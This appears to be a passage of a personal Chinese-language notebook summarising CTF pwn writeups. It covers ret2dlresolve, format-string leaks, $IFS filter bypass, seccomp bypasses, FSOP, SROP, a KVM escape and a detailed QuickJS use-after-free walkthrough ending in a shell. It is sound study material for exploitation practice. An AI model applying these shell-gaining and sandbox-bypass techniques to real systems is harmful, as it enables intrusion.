- 构造一个不包含任何可执行代码段的ELF，使其在运行时获取shell。将PT_INTERP段（this section indicates the program path name that will be invoked as the interpreter of the ELF should it be an executable）设为`/bin/sh`即可
- 脚本： https://github.com/r1ru/ctf-writeups/tree/master/2024/AmateursCTF/baby-elfcrafting 。但是我找不到elf是哪个第三方库……官方的exp要自己从那个asm代码编译：`nasm -f elf64 -o exp exp.asm`
192. [buffer-overflow](https://unvariant.pages.dev/writeups/amateursctf-2024/pwn-buffer-overflow/)
- rust里将部分unicode字符转换为大写时会导致一个字符被延长至多个字符，有栈溢出风险。unicode表： https://doc.rust-lang.org/src/core/unicode/unicode_data.rs.html#966
193. [reflection](https://hackmd.io/@Zzzzek/HyUXVYQl0)
- 64位[ret2dlresolve](https://syst3mfailure.io/ret2dl_resolve/)+栈迁移。顺便找到个不错的文章： https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/
194. [Echo Chamber](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/pwn/echo-chamber)
- 能用的格式化字符串被过滤时，可以用`%*`泄漏32-bit值。题目作者的解释：“tho u can not specify the index for this but to can pad some %c before it to leak value on any position. ex: `%c %c %c %*` will leak the 4th value”
- `__run_exit_handlers`(`.fini_array`,`.dtors`)的利用。这个之前见过很多次了，覆盖成想要的函数就能在程序退出时调用那个函数。可能要用`readelf -d`查看`.fini_array`的偏移。顺便再复习一下，这玩意只能帮助重新调用函数一次，不能无限循环。不过还不确定是不是只能覆盖一次，因为wp后续就利用stack修改返回地址了，没有再用`.fini_array`
195. [libprce3](https://mwlik.github.io/2024-05-10-defcon-quals-libprce3-challenge/)
- 后门分析实战。大概是先用git diff找到新版本文件与之前稳定版本的区别，然后即兴发挥，分析后门在哪
- 当无法使用空格时可以使用`$IFS`。但有时候会被bash错误识别，比如`ls$IFSsomething`，意在执行命令`ls something`，但bash有可能将整个`$IFSsomething`识别为一个东西，进而得到一个空字符串。解决办法是在中间加个任意数字`$num`：bash parses `$somenumber` it stops by the first number and get evaluated to nothing
196. [SlowJS++](https://maplebacon.org/2024/05/sdctf-slowjspp/)
- QuickJS Javascript engine pwn。UAF漏洞出现在题目作者patch的`async_func_resume`函数，可利用此漏洞获取AAR和AAW，进而获取RCE。个人感觉这题（个人没见过很多这种题，但怀疑这类题都是这样的）和js关系不大，漏洞要通过反编译+diff QuickJS的binary找到，而binary也是用C写的。所以这题某种意义上还是个“菜单堆题”，只是菜单的功能很“隐蔽”，顶上套了个js的皮。js唯一的用处只是用来与内部引擎沟通，调用“菜单功能”等
- QuickJS internals介绍：JSValue，JSString，JSObject
- 调试技巧：可以在`js_math_min_max`函数（或者说`quickjs.c:41563`）下个断点，然后调用`Math.min(v)`来触发断点。此时检查`JSValueConst *argv`(`argv->u.ptr`,或者说r8寄存器)就能查看v的内存布置
- 简述exp过程。协程（async）函数返回某个object a后，a的ref count会减去1（这块是作者故意patch出的漏洞，正常情况下不应该这样做）。当某个object的ref count为0时，会被garbage collector（gc）回收，或者说free掉object所在的内存。现在我们全局定义一个数组arr，并使协程函数fn1返回arr。调用两次fn1（具体调用几次可通过实验的方式得到。毕竟不了解全部的引擎内部实现，经常会有些奇怪的情况发生，实践出真知）会让arr所在的内存被free掉。但那个全局的arr引用还在，出现UAF。继续构造几个object（从和metadata同样大小的free list）中分配几个chunk，使某个内部管理数组的metadata（见QuickJS internals介绍）被分配到一个可被控制的数组uaf_arr里。此时我们就可以往uaf_arr里写值来修改之前那个数组arr的metadata了。通过修改metadata的`.u.array.u.ptr`属性（指向数组的存储内存）就能任意读写某个地址处的数据。但是现在我们不知道任何地址，需要想个办法泄漏地址。可以在JSString上用同样的UAF步骤获取到某个JSString的metadata，然后修改metadata的length属性为一个很大的值，打印字符串时就能越界泄漏一部分内存了，里面就有我们需要的libc和堆基地址。最后是获取RCE。很多js函数的第一个参数为`JSContext *ctx`，这个object里有个叫rt的属性指向一个JSRuntime object。这玩意里又有两个属性`JSMallocFunctions mf`和`JSMallocState malloc_state`。mf里又有4个函数指针，其中一个是`js_malloc`。这个函数的第一个参数正好就是`JSMallocState *`。所以只要把`ctx->rt->mf.js_malloc`这个函数指针覆盖成system，并往`&(ctx->rt->malloc_state)`里写`/bin/sh`，之后随便分配一个object触发`js_malloc`就能getshell了。另外，在getshell之前需要将arr的metadata的shape属性指向一块空内存（全是0，比如堆开始的地方）。这样才不会在js内部调用find_own_property时segmentation fault
- 一些编写exp时需要注意的地方。因为js有gc控制内存，所以很难预测某个object什么时候被free。比如有时候写一句`Math.min`会导致某个object不会被free掉，注释掉就可以了；有时候又完全没影响。JS的源代码会被分配到堆上，所以写太多注释（改动成功的exp的代码长度太多）也会导致exp无法正常运行
- 另一篇也是UAF漏洞的wp： https://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html
197. [babyheap](/CTF/Codegate%20Junior/babyheap.md)
- libc 2.35堆溢出+uaf
- 一些个人搞chunk overlap的实践记录。chunk overlap其实不用考虑太多，只要覆盖chunk的size为任意一个合理的size就行了
- libc 2.38 RCE方法 https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc 实践记录
198. [oorrww](https://lenartlola.github.io/post/oorrww_dist/)
- 如何将float转为hex。可能这样说不明确，详细解释就是，c语言将某处内存的数据看作float输出，如何还原那处数据？
```py
int(float.hex(float(value))[5:17], 16)
```
- 以及上面那个操作的反向操作:
```py
struct.unpack('d', bytes.fromhex(p64(data).hex()))[0]
```
- 使用struct的做法： https://ihuomtia.onrender.com/l3ak-pwn-oorrww
- 有关seccomp绕过
  - 若没有检查arch type，可以调用其他架构的系统调用。比如64位程序调用32位execve系统调用
  - 若没有检查大于`0x40000000`的系统调用号，可以用`0x40000000 + SYSCALL_NUMBER`绕过。因为内核会忽略掉系统调用号的高位
- 栈迁移+orw syscall rop。不算个标准的orw，因为wp里open后用sendfile输出文件内容。原因是按部就班写read和write的rop需要太多字节。另外sendfile这个函数有4个参数，syscall时需要用r10记录第四个参数。可以用位于libc `0x119170` 处的gadget，只要能控制rcx就能控制r10，顺便把系统调用号设置成sendfile的
  - 这题的[revenge版本](https://ihuomtia.onrender.com/l3ak-pwn-oorrww-revenge)也是栈迁移+ORW，不过是迁移到bss段上。另外这篇wp是较为“标准”的ORW，作者用一些精心挑选的gadget缩短了rop链长度
199. [chonccfile](https://github.com/Nosiume/CTF-Writeups/tree/master/L3akCTF-2024/pwn/chonccfile)
- libc 2.39 UAF+FSOP RCE。wp里有个FSOP的利用模板。另外新开的第一个文件的file structure也可以泄露libc地址，因为单向链表的性质，其`_chain`正好指向一个libc里的文件结构
- 官方wp： https://github.com/L3AK-TEAM/L3akCTF-2024-public/tree/main/pwn/chonccfile ，对fsop的分析详细些
200. [Real-vm](https://hackmd.io/Fu4PG9dqRg2K7XEyM6HtgQ)
- libc 2.23 kvm(vm escape)+FSOP RCE。虽然是kernel上的虚拟机，但还是用户态下的pwn
- 这个kvm用起来挺复杂的，设置和调用需要用ioctl，逆向起来也烦。可以用`strace -v`查看ioctl的参数。在long mode下运行还要自行设置page table。查看程序设置的page table是什么只需要在其设置寄存器时查看cr3的值，它指向的地址就是page table的起始处。同理，假如vm内部运行用户的代码，攻击者也可以伪造page table并设置cr3来访问任意地址。在kvm内部访问特定的物理内存会触发KVM_EXIT_MMIO
- 另一道题，关于页表（page table）等知识讲得更详细： https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm
201. [pors](https://github.com/L3AK-TEAM/L3akCTF-2024-public/tree/main/pwn/pors)
- SROP syscall chain。参考 https://ctf-wiki.org/en/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop
202. [Future of Pwning 1](https://github.com/0xM4hm0ud/CTF-Writeups/tree/main/GPN%20CTF%202024/Pwning/Future%20of%20Pwning%201)
- [ForwardCom](https://www.agner.org/optimize/forwardcom.pdf) assembly编写
- 更详细的wp： https://github.com/lars-ctf/writeup-gpn22/blob/main/future-of-pwning-1.md
203. [Polyrop warmup](https://github.com/MathVerg/WriteUp/tree/master/GPN2024/PolyropWarmup)
- x86_64, aarch64, arm, riscv64 和 s390x架构下的绕过aslr和ret2win。关键是要用qemu运行各个架构的binary然后gdb检查stack